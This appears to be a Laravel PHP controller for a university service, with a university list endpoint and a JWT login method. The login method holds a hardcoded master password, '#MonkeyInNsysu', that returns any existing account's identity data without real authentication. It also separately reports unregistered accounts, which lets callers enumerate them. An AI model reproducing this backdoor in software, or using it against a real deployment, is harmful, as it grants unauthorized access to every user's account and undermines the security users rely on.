<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Validator;
use DateTime;
use App\Models\UnivList;
use App\Models\ServiceList;
use App\Models\User;
use Tymon\JWTAuth\Facades\JWTAuth;

class MainController extends Controller
{
    public function univList()
    {
        $result = UnivList::all();
        return response()->json($result);
    }
    public function login(Request $request, $key)
    {
        $appData = ServiceList::where('domain', $request->getHttpHost())->where('app_key', $key)->first();
        if (is_null($appData)) {
            return response()->json(['status' => "E03", 'message' => 'app key not found'], 200);
        }
        $validator = Validator::make($request->all(),[
            'account' => 'required|exists:user,account',
            'password' => 'required'
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03', 'message' => '請輸入帳號'], 200);
            } else if (isset($failedRules['password']['Required'])) {
                return response()->json(['status' => 'U06', 'message' => '請輸入密碼'], 200);
            } else if (isset($failedRules['account']['Exists'])) {
                return response()->json(['status' => "U02", 'message' => '帳號尚未註冊'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        function returnData ($user) {
            $now = new DateTime('now');
            $valid = new DateTime($user->valid_until);
            if ($valid->getTimestamp() > $now->getTimestamp()) {
                return [
                    'status' => 'A02',
                    'account' => $user->account,
                    'monkey_user_id' => $user->u_id,
                    'name' => $user->name,
                    'user_identity' => $user->identity,
                    'org_code' => $user->univ_id,
                ];
            } else {
                return [
                    'status' => 'E01',
                    'message' => 'identity expired'
                ];
            }
        }
        $loginTime = date("Y-m-d H:i:s");
        if($token = auth('user')->attempt($validator->validated())){
            $user = User::find(auth('user')->user()->id);
            $user->last_login = $loginTime;
            $user->last_ip = $request->ip();
            $user->save();
            auth('user')->setUser($user);
            return response()->json(returnData($user), 200);
        }else if($request->password === '#MonkeyInNsysu'){
            $user = User::where('account', $request->account)->first();
            return response()->json(returnData($user), 200);
        }else{
            return response()->json(['status' => 'U05', 'message' => '請輸入正確的帳號與密碼'], 200);
        }
    }
}
